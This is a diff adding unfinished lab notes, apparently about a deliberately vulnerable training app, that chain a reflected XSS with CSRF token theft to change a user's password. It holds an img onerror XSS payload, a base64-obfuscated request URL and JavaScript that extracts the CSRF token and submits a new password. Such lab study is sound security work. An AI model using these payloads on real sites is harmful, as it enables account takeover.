@@ -1,0 +1,47 @@
+If we now try the previous URL, this does not work anymore, because
+
+1. We need another exploit for obtaining a reflective XSS on the high security level
+
+2. The password change endpoint is protected with a CSRF token.
+
+To fix the first problem, we realize that for solving the high reflective XSS level we need the following payload
+
+ <img src='#' onerror=alert(1) />
+
+Then we put the previous payload, however this time we must base64 the URL otherwise it won't work
+
+ <img src='#' onerror="var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', atob('aHR0cDovL2V2aWwvdnVsbmVyYWJpbGl0aWVzL2NzcmYvP3Bhc3N3b3JkX25ldz1uZXdwYXNzJnBhc3N3b3JkX2NvbmY9bmV3cGFzcyZDaGFuZ2U9Q2hhbmdl'), false); xmlHttp.send(null);" />
+
+However, even this payload does not work, because of the CSRF code. The idea is to first do a GET request, extract the CSRF code, and then send it in the URL. In particular, we want to create the following URL
+
+ GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=6bed618fc0eaf44857bfa115c4c61a79
+
+where user_token was obtained from the previous GET request to the page. 
+
+-----------------
+
+First let's experiment with JS code that is able to extract the user_token from the webpage in order to craft a valid GET request for changing the password of the user with a custom password.
+
+var newpass = "test"
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://evil/vulnerabilities/csrf/', false);
+xhr.onload = function() {
+    var doc = new DOMParser().parseFromString(this.responseText, "text/xml");
+    var csrf = doc.getElementsByName("user_token")[0].getAttribute("value");
+    var xhr2 = new XMLHttpRequest();    
+    xhr2.open('GET', `http://evil/vulnerabilities/csrf/?password_new=${newpass}&password_conf=${newpass}&Change=Change&user_token=${csrf}`, false);
+    xhr2.send(null);
+};
+xhr.send(null);
+
+-----------------
+
+Now we need to find a way to execute this JS payload onto the victim browser.
+
+TODO...
+
+-----------------
+
+References
+
+- https://labs.withsecure.com/publications/getting-real-with-xss
